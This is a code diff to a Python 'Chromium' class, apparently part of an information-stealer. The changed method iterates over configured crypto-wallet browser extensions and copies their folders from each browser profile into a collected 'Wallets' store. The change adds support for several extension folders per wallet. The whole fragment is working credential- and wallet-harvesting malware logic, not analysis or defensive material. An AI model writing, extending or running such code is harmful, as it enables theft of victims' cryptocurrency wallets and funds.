@@ -379,22 +379,23 @@ class Chromium:
         Returns:
         - None.
         """
-        for wallet in self.__config.WalletLogs[self.__browser_name]:
+        for wallet in self.__config.WalletLogs:
+            for extension in wallet["folders"]:
 
-            try:
+                try:
 
-                extension_path = path.join(wallets, wallet["folder"])
+                    extension_path = path.join(wallets, extension)
 
-                if not path.exists(extension_path):
-                    continue
+                    if not path.exists(extension_path):
+                        continue
 
-                self.__storage.add_from_disk(
-                    extension_path,
-                    path.join(self.__path, rf'{profile} {wallet["name"]}')
-                )
+                    self.__storage.add_from_disk(
+                        extension_path,
+                        path.join("Wallets", rf'{profile} {wallet["name"]}')
+                    )
 
-            except Exception as e:
-                print(f"[{self.__browser_name}]: {repr(e)}")
+                except Exception as e:
+                    print(f"[{self.__browser_name}]: {repr(e)}")
 
     def _process_profile(self, profile: str) -> None:
         """
